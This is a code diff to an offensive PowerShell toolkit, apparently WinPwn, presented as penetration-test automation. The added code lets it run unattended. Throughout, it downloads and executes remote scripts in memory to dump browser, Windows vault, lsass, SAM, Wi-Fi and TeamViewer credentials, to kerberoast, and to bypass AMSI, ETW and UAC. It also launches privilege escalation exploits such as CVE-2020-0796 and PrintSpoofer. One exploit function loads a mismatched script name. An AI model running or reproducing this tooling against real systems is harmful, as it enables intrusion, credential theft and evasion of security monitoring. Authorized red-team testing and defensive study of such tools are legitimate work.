@@ -105,9 +105,12 @@ function sharpcradle{
         [string]
         $argument2,
         [string]
-        $argument3
+        $argument3,
+        [switch]
+        $noninteractive
     )
     pathcheck
+    BlockEtw
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     if ($allthosedotnet)
     {
@@ -120,6 +123,53 @@ __        ___       ____
    \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
    --> Automate some internal Penetrationtest processes
 '@
+        if ($noninteractive)
+        {
+            Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to the console only'
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); 
+            Invoke-Seatbelt -Command "all"
+            
+            Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .\Exploitation\'
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
+            Invoke-Rubeus -Command "asreproast /format:hashcat" >> $currentPath\Exploitation\ASreproasting.txt
+            Invoke-Rubeus -Command "kerberoast /format:hashcat" >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt
+            Get-Content $currentPath\Exploitation\ASreproasting.txt
+            Get-Content $currentPath\Exploitation\Kerberoasting_Rubeus.txt
+
+            Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
+            Invoke-watson >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
+            Get-Content $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
+
+            Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
+            Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt
+
+            Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\'
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
+            if (isadmin)
+            {
+                Invoke-SharpUp -command "audit" >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt
+            }
+            else
+            {
+                Invoke-SharpUp -command " " >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt
+            }
+
+            if (isadmin)
+            {
+                Write-Host -ForegroundColor Yellow 'Running Internalmonologue. Output goes to .\Exploitation\'
+                iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
+                Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true" >> $currentPath\Exploitation\Internalmonologue.txt
+                Get-Content $currentPath\Exploitation\Internalmonologue.txt
+             }
+             else
+             {
+                Write-Host -Foregroundcolor Yellow "Run as admin."
+             }
+            
+            return
+        }
         
         do
         {
@@ -267,13 +317,19 @@ function sessionGopher
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
+     param(
+        [switch]
+        $noninteractive
+	)
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/segoph.ps1')
-    $whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'
+    $whole_domain = "no"
+    if (!$noninteractive){$whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'}
     if ($whole_domain -eq "yes" -or $whole_domain -eq "y" -or $whole_domain -eq "Yes" -or $whole_domain -eq "Y")
     {
-            $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a fuckin lot of time'
+            
+	        $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a fuckin lot of time'
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
                 Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
@@ -287,7 +343,11 @@ function sessionGopher
     }
     else
     {
-        $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a lot of time'
+        $session = "no"
+	    if(!$noninteractive)
+        {
+            $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a lot of time'
+        }
             if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
             {
                 Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
@@ -310,9 +370,75 @@ function kittielocal
         Author: @S3cur3Th1sSh1t
         License: BSD 3-Clause
     #>
+    param(
+        [switch]
+        $noninteractive,
+        [switch]
+        $credentialmanager,
+        [switch]
+        $mimikittie,
+        [switch]
+        $rundll32lsass,
+        [switch]
+        $lazagne,
+        [switch]
+        $browsercredentials,
+        [switch]
+        $mimikittenz,
+        [switch]
+        $wificredentials,
+        [switch]
+        $samdump,
+        [switch]
+        $sharpcloud
+    )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
     AmsiBypass
+    if ($noninteractive)
+    {
+        if ($credentialmanager)
+        {
+            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
+            Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"
+            Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
+        }
+        if($mimikittie)
+        {
+            if (isadmin){obfuskittiedump}
+        }
+        if($rundll32lsass)
+        {
+            if(isadmin){dumplsass}
+        }
+        if($lazagne)
+        {
+            lazagnemodule
+        }
+        if($browsercredentials)
+        {
+            Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'
+            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
+            Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt
+        }
+        if($mimikittenz)
+        {
+            kittenz
+        }
+        if($wificredentials)
+        {
+            if(isadmin){wificreds}
+        }
+        if ($samdump)
+        {
+            if(isadmin){samfile}
+        }
+        if ($sharpcloud)
+        {
+            SharpCloud
+        } 
+        return
+    }
       
         do
         {
@@ -327,16 +453,17 @@ __        ___       ____
 '@
             Write-Host "================ WinPwn ================"
             Write-Host -ForegroundColor Green '1. Just run Invoke-WCMDump (no Admin need)! '
-            Write-Host -ForegroundColor Green '2. Run an obfuscated version of the powerhell kittie (Admin session only, heuristic detection likely)! '
+            Write-Host -ForegroundColor Green '2. Run an obfuscated version of the powerhell kittie! '
             Write-Host -ForegroundColor Green '3. Run Safetykatz in memory (Admin session only)! '
             Write-Host -ForegroundColor Green '4. Only dump lsass using rundll32 technique! (Admin session only) '
             Write-Host -ForegroundColor Green '5. Download and run an obfuscated lazagne executable! '
             Write-Host -ForegroundColor Green '6. Dump Browser credentials using Sharpweb! (no Admin need)'
             Write-Host -ForegroundColor Green '7. Run mimi-kittenz for extracting juicy info from memory! (no Admin need)'
             Write-Host -ForegroundColor Green '8. Get some Wifi Credentials! (Admin session only)'
-	    Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only)'
-	    Write-Host -ForegroundColor Green '10. Check for the existence of credential files related to AWS, Microsoft Azure, and Google Compute!'	    
-	    Write-Host -ForegroundColor Green '11. Exit. '
+	        Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only)'
+	        Write-Host -ForegroundColor Green '10. Check for the existence of credential files related to AWS, Microsoft Azure, and Google Compute!'
+		Write-Host -ForegroundColor Green '11. Decrypt Teamviewer Passwords!'
+	        Write-Host -ForegroundColor Green '12. Exit. '
             Write-Host "================ WinPwn ================"
             $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
             
@@ -347,16 +474,26 @@ __        ___       ____
                 3{if(isadmin){safedump}}
                 4{if(isadmin){dumplsass}}
                 5{lazagnemodule}
-                6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\';iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1'); Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt}
+                6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\';iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1'); Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt}
 		        7{kittenz}
 		        8{if(isadmin){wificreds}}
 		        9{if(isadmin){samfile}}
 			10{SharpCloud}
+			11{decryptteamviewer}
              }
         }
-        While ($masterquestion -ne 11)
+        While ($masterquestion -ne 12)
 }
+function decryptteamviewer
+{
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    pathcheck
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/TeamViewerDecrypt/master/TeamViewerDecrypt.ps1')
+    TeamviewerDecrypt >> $currentPath\Exploitation\TeamViewerPasswords.txt
+    Get-Content $currentPath\Exploitation\TeamViewerPasswords.txt
+    Start-Sleep 5
 
+}
 function SharpCloud
 {
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
@@ -364,13 +501,14 @@ function SharpCloud
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpCloud.ps1')
     Invoke-SharpCloud -Command all >> $currentPath\Exploitation\CloudCreds.txt
     Get-Content $currentPath\Exploitation\CloudCreds.txt
-    pause;
+    Start-Sleep 5
 }
 
 function safedump
 {
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
+    blocketw
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
     Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
 }
@@ -383,7 +521,7 @@ function obfuskittiedump
     Write-Host -ForegroundColor Yellow "Dumping Credentials output goes to .\Exploitation\Credentials.txt"
     Invoke-Mimikatz >> $currentPath\Exploitation\Credentials.txt
     Get-Content $currentPath\Exploitation\Credentials.txt
-    pause;
+    Start-Sleep -Seconds 5
 }
 function wificreds
 {
@@ -393,7 +531,7 @@ function wificreds
     Write-Host "Saving to .\Exploitation\WIFI_Keys.txt"
     Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
     Get-Content $currentPath\Exploitation\WIFI_Keys.txt
-    pause;
+    Start-Sleep -Seconds 5
 }
     
 function kittenz
@@ -404,7 +542,7 @@ function kittenz
     Write-Host -ForegroundColor Yellow 'Running the small kittie, output to .\Exploitation\kittenz.txt'
     inbox | out-string -Width 5000 >> $currentPath\Exploitation\kittenz.txt
     Get-Content $currentPath\Exploitation\kittenz.txt
-    pause;
+    Start-Sleep -Seconds 5
 }
     
 function samfile
@@ -415,7 +553,7 @@ function samfile
     Write-Host "Dumping SAM, output to .\Exploitation\SAMDump.txt"
     Invoke-PowerDump >> $currentPath\Exploitation\SAMDump.txt
     Get-Content $currentPath\Exploitation\SAMDump.txt
-    pause;
+    Start-Sleep -Seconds 5
 }
 
 function dumplsass
@@ -475,35 +613,39 @@ __        ___       ____
     do
     {
         Write-Host "================ WinPwn ================"
- 	Write-Host -ForegroundColor Green '1. MS15-077 - (XP/Vista/Win7/Win8/2000/2003/2008/2012) x86 only!'
- 	Write-Host -ForegroundColor Green '2. MS16-032 - (2008/7/8/10/2012)!'
+ 	    Write-Host -ForegroundColor Green '1. MS15-077 - (XP/Vista/Win7/Win8/2000/2003/2008/2012) x86 only!'
+ 	    Write-Host -ForegroundColor Green '2. MS16-032 - (2008/7/8/10/2012)!'
         Write-Host -ForegroundColor Green '3. MS16-135 - (WS2k16 only)! '
         Write-Host -ForegroundColor Green '4. CVE-2018-8120 - May 2018, Windows 7 SP1/2008 SP2,2008 R2 SP1! '
         Write-Host -ForegroundColor Green '5. CVE-2019-0841 - April 2019!'
         Write-Host -ForegroundColor Green '6. CVE-2019-1069 - Polarbear Hardlink, Credentials needed - June 2019! '
         Write-Host -ForegroundColor Green '7. CVE-2019-1129/1130 - Race Condition, multiples cores needed - July 2019! '
-	Write-Host -ForegroundColor Green '8. CVE-2019-1215 - September 2019 - x64 only! '
-	Write-Host -ForegroundColor Green '9. CVE-2020-0683 - February 2020 - x64 only! '
-        Write-Host -ForegroundColor Green '10. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
-        Write-Host -ForegroundColor Green '11. Exit. '
+	    Write-Host -ForegroundColor Green '8. CVE-2019-1215 - September 2019 - x64 only! '
+	    Write-Host -ForegroundColor Green '9. CVE-2020-0683 - February 2020 - x64 only! '
+        Write-Host -ForegroundColor Green '10. CVE-2020-0796 - March 2020 - no bind shell! '
+        Write-Host -ForegroundColor Green '11. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
+        Write-Host -ForegroundColor Green '12. PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019!'
+        Write-Host -ForegroundColor Green '13. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
         Switch ($masterquestion) 
         {
-	     1{ms15-077}
-             2{ms16-32}
-             3{ms16-135}
-             4{CVE-2018-8120}
-             5{CVE-2019-0841}
-             6{cve-2019-1069}
-             7{CVE-2019-1129}
-	     8{CVE-2019-1215}
-	     9{CVE-2020-0683}
-             10{juicypot}
+	        1{ms15-077}
+            2{ms16-32}
+            3{ms16-135}
+            4{CVE-2018-8120}
+            5{CVE-2019-0841}
+            6{cve-2019-1069}
+            7{CVE-2019-1129}
+	        8{CVE-2019-1215}
+	        9{CVE-2020-0683}
+            10{cve-2020-0796}
+            11{juicypot}
+            12{printspoofer}
        }
     }
- While ($masterquestion -ne 11)
+ While ($masterquestion -ne 13)
 
 }
 
@@ -513,6 +655,18 @@ function testtemp
  {
     mkdir C:\temp
  }
+}
+
+function cve-2020-0796
+{
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2020-0683.ps1')
+    cve-2020-0796
+}
+
+function printspoofer
+{
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/printspoof_interactive.ps1')
+    printspoof
 }
 
 function CVE-2020-0683
@@ -597,6 +751,7 @@ function CVE-2018-8120
 function CVE-2019-0841
 {
     testtemp
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-Webrequest -Uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/nc.exe" -Outfile C:\temp\nc.exe
     Invoke-Sharpcradle -uri "https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/privesc.exe" -argument1 license.rtf
@@ -605,6 +760,7 @@ function CVE-2019-0841
 }
 function CVE-2019-1129
 {
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
     Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
 	Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
 	Start-Sleep -Seconds 15
@@ -616,6 +772,7 @@ function CVE-2019-1129
 
 function CVE-2019-1069
 {
+	blocketw
         iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
     	$polaraction = Read-Host -Prompt 'Do you have a valid username and password for CVE-2019-1069?'
 	    if ($polaraction -eq "yes" -or $polaraction -eq "y" -or $polaraction -eq "Yes" -or $polaraction -eq "Y")
@@ -667,6 +824,11 @@ function localreconmodules
         License: BSD 3-Clause
     #>
     #Local Reconning
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive   
+    )
 
 
            
@@ -886,7 +1048,7 @@ function localreconmodules
             function morerecon{
             if (isadmin)
             {
-                $PSrecon = Read-Host -Prompt 'Do you want to gather local computer Informations with PSRecon? (yes/no)'
+                if(!$noninteractive){$PSrecon = Read-Host -Prompt 'Do you want to gather local computer Informations with PSRecon? (yes/no)'}
                 if ($PSrecon -eq "yes" -or $PSrecon -eq "y" -or $PSrecon -eq "Yes" -or $PSrecon -eq "Y")
                 {
                     invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/gfoss/PSRecon/master/psrecon.ps1'' -Outfile .\LocalRecon\Psrecon.ps1;Write-Host -ForegroundColor Yellow ''Starting PsRecon:'';.\LocalRecon\Psrecon.ps1;pause}'
@@ -904,8 +1066,8 @@ function localreconmodules
             
                 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/find-interesting.ps1')
                 Write-Host -ForegroundColor Yellow 'Looking for interesting files:'
-                try{Find-InterestingFile -Path 'C:\' -Outfile "$currentPath\LocalRecon\InterestingFiles.txt"}catch{Write-Host ":-("}
-                try{Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup -Outfile "$currentPath\LocalRecon\MoreFiles.txt"}catch{Write-Host ":-("}
+                try{Find-InterestingFile -Path 'C:\' >> "$currentPath\LocalRecon\InterestingFiles.txt"}catch{Write-Host ":-("}
+                try{Find-InterestingFile -Path 'C:\' -Terms pass,login,rdp,kdbx,backup >> "$currentPath\LocalRecon\MoreFiles.txt"}catch{Write-Host ":-("}
                 Write-Verbose "Enumerating more interesting files..."
     
                 $SearchStrings = "*secret*","*net use*","*.kdb*","*creds*","*credential*","*.vmdk","*confidential*","*proprietary*","*pass*","*credentials*","web.config","KeePass.config*","*.kdbx","*.key","tnsnames.ora","ntds.dit","*.dll.config","*.exe.config"
@@ -913,58 +1075,42 @@ function localreconmodules
       
                 $IndexedFiles |Format-List |Out-String -width 500 >> "$currentPath\LocalRecon\Sensitivelocalfiles.txt"
                 GCI $ENV:USERPROFILE\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.kdb,*.rdp,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String -width 500 >> "$currentPath\LocalRecon\MoreSensitivelocalfiles.txt"
-                function Get-IndexedFiles {
-                param (
-                [Parameter(Mandatory=$true)][string]$Pattern)  
-    
-                if($Path -eq ""){$Path = $PWD;} 
-        
-                $pattern = $pattern -replace "\*", "%"  
-                $path = $path + "\%"
-    
-                 $con = New-Object -ComObject ADODB.Connection
-                $rs = New-Object -ComObject ADODB.Recordset
-    
-                Try {
-                    $con.Open("Provider=Search.CollatorDSO;Extended Properties='Application=Windows';")}
-                Catch {
-                    "[-] Indexed file search provider not available";Break
-                }
-                $rs.Open("SELECT System.ItemPathDisplay FROM SYSTEMINDEX WHERE System.FileName LIKE '" + $pattern + "' " , $con)
-    
-                While(-Not $rs.EOF){
-                $rs.Fields.Item("System.ItemPathDisplay").Value
-                 $rs.MoveNext()
-                }
-            }
+
             }
             
             function browserpwn{
-            $chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'
+            $chrome = "yes"
+            if (!$noninteractive){$chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'}
             if ($chrome -eq "yes" -or $chrome -eq "y" -or $chrome -eq "Yes" -or $chrome -eq "Y")
             {
                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-ChromeDump.ps1')
-                Install-SqlLiteAssembly
-                Get-ChromeDump >> "$currentPath\Exploitation\Chrome_Credentials.txt"
-                Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
-                Write-Host -ForegroundColor Yellow 'Done, look in the localrecon folder for creds/history:'
+                try
+                {
+                    Install-SqlLiteAssembly
+                    Get-ChromeDump >> "$currentPath\Exploitation\Chrome_Credentials.txt"
+                    Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
+                    Write-Host -ForegroundColor Yellow 'Done, look in the localrecon folder for creds/history:'
+                }
+                catch{}
             }
-	    
-            $IE = Read-Host -Prompt 'Dump IE / Edge Browser passwords? (yes/no)'
+	        $IE = "yes"
+            if (!$noninteractive){$IE = Read-Host -Prompt 'Dump IE / Edge Browser passwords? (yes/no)'}
             if ($IE -eq "yes" -or $IE -eq "y" -or $IE -eq "Yes" -or $IE -eq "Y")
             {
 	    	    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
 	    	    $vault = New-Object Windows.Security.Credentials.PasswordVault 
 	    	    $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } >> "$currentPath\Exploitation\InternetExplorer_Credentials.txt"
 	        }
-            $browserinfos = Read-Host -Prompt 'Dump all installed Browser history and bookmarks? (yes/no)'
+            $browserinfos = "yes"
+            if (!$noninteractive){$browserinfos = Read-Host -Prompt 'Dump all installed Browser history and bookmarks? (yes/no)'}
             if ($browserinfos -eq "yes" -or $browserinfos -eq "y" -or $browserinfos -eq "Yes" -or $browserinfos -eq "Y")
             {
                 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Get-BrowserInformation.ps1')
                 Get-BrowserInformation | out-string -Width 4096 >> "$currentPath\LocalRecon\AllBrowserHistory.txt"
             }
             }
-                pathcheck
+            
+            pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     @'
 
@@ -978,6 +1124,17 @@ __        ___       ____
    --> Localreconmodules
 
 '@
+    if ($noninteractive)
+    {
+        generalrecon
+        powershellsensitive
+        browserpwn
+        dotnet
+        passhunt -local $true -noninteractive
+        sessionGopher -noninteractive
+        sensitivefiles   
+        return;
+    }
     
     do
     {
@@ -1007,6 +1164,37 @@ __        ___       ____
        }
     }
  While ($masterquestion -ne 9)
+}
+
+function Get-IndexedFiles 
+{
+     param (
+     [Parameter(Mandatory=$true)][string]$Pattern)  
+     
+     $drives = (Get-PSDrive -PSProvider FileSystem).Root
+     foreach ($drive in $drives)
+     {
+     Write-Host -ForegroundColor Yellow "Searching for files in drive $drive" 
+     $Path = $drive 
+        
+     $pattern = $pattern -replace "\*", "%"  
+     $path = $path + "\%"
+    
+     $con = New-Object -ComObject ADODB.Connection
+     $rs = New-Object -ComObject ADODB.Recordset
+    
+     Try {
+     $con.Open("Provider=Search.CollatorDSO;Extended Properties='Application=Windows';")}
+     Catch {
+     "[-] Indexed file search provider not available";Break
+     }
+     $rs.Open("SELECT System.ItemPathDisplay FROM SYSTEMINDEX WHERE System.FileName LIKE '" + $pattern + "' " , $con)
+    
+     While(-Not $rs.EOF){
+     $rs.Fields.Item("System.ItemPathDisplay").Value
+     $rs.MoveNext()
+     }
+     }
 }
 
 function SYSTEMShell
@@ -1052,6 +1240,16 @@ __        ___       ____
 
 function UACBypass
 {
+    [CmdletBinding()]
+    Param (
+        [Switch]
+        $noninteractive,
+        [string]
+        $command,
+        [string]
+        $technique   
+    )
+
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     @'
@@ -1066,6 +1264,25 @@ __        ___       ____
    --> UAC Bypass
 
 '@
+    if($noninteractive)
+    {
+        if ($technique -eq "ccmstp")
+        {
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/uaccmstp.ps1')
+            uaccmstp -BinFile $command
+        }
+        elseif($technique -eq "magic")
+        {
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/uacmagic.ps1')
+            uacmagic -BinPath $command
+        }
+        elseif ($technique -eq "DiskCleanup")
+        {
+            iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/diskcleanupuac.ps1')
+            DiskCleanupBypass -command $command
+        }
+        return
+    }
     
     do
     {
@@ -1098,13 +1315,18 @@ function passhunt
         License: BSD 3-Clause
     #>
     #Local/Domain Recon / Privesc
+    [CmdletBinding()]
+
     Param
     (
         [bool]
         $local,
 
         [bool]
-        $domain
+        $domain,
+        
+        [Switch]
+        $noninteractive
     )
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
@@ -1124,43 +1346,34 @@ function passhunt
             $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}
 
             Write-Host -ForegroundColor Yellow 'Starting Passhunt.exe for all found shares.'
-            if (test-path $currentPath\passhunt.exe)
-            {
-                foreach ($line in $testShares)
-                {
-                    cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
- -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.inf,.reg,.cmd,.lo
-g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
-                }
-            }
-            else
-            {
+	    if (!(test-path $currentPath\passhunt.exe))
+	    {
                 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                 Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
-                foreach ($line in $shares)
+            }
+	    foreach ($line in $shares)
                 {
                     cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
- -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.inf,.reg,.cmd,.lo
+ -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
 g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
                 } 
-                                    
-            }
-        }
+       }
         if ($local)
         {
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-            Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
+            if (!(test-path $currentPath\passhunt.exe)){Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe}
             
             cmd /c start powershell -Command "$currentPath\passhunt.exe"
-            $sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares?'
+            $sharepasshunt = "yes"
+            if (!$noninteractive){$sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares?'}
             if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
             {
-                get-WmiObject -class Win32_Share | ft Path >> passhuntshares.txt
-                $shares = get-content .\passhuntshares.txt | select-object -skip 4    
+                $shares = (Get-PSDrive -PSProvider FileSystem).Root
+                    
                 foreach ($line in $shares)
                 {
                     cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
- -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.inf,.reg,.cmd,.lo
+ -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
 g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
                 } 
